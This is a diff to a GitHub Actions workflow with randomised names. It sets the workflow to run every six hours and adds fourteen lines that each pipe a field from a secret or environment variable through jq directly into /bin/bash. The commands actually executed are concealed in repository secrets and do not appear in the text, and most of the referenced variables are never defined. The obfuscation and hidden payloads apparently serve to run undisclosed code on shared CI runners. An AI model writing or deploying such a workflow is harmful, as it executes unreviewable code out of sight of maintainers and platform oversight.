@@ -1,8 +1,10 @@
 name: kezhenchou1268
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
+    - cron: '55 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,9 +13,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: kezhenchou1268
         env:
-          kggx4: ${{ secrets.kggx4 }}
+          hike0544: ${{ secrets.hike0544 }}
         run: |
-          echo $kggx4 | jq -r .uwqrl48 | /bin/bash
-          echo $xk9 | jq -r .cg1 | /bin/bash
-          echo $dh2843 | jq -r .ybq9 | /bin/bash
+          echo $hike0544 | jq -r .zvtij63389 | /bin/bash
+          echo $nk42762 | jq -r .ysm880 | /bin/bash
+          echo $jmi9 | jq -r .dgvb97 | /bin/bash
+          echo $acm505 | jq -r .uu5 | /bin/bash
+          echo $w79 | jq -r .uqqf207 | /bin/bash
+          echo $x725 | jq -r .qfvve0317 | /bin/bash
+          echo $r0527 | jq -r .k87 | /bin/bash
+          echo $y5 | jq -r .iz33 | /bin/bash
+          echo $cyscn9587 | jq -r .dmsql8211 | /bin/bash
+          echo $jn5 | jq -r .gyvj2 | /bin/bash
+          echo $srxrm0 | jq -r .zuyj03721 | /bin/bash
+          echo $ma5523 | jq -r .sbrm62 | /bin/bash
+          echo $yb972 | jq -r .gamw8 | /bin/bash
+          echo $bkx20 | jq -r .ae1635 | /bin/bash
 
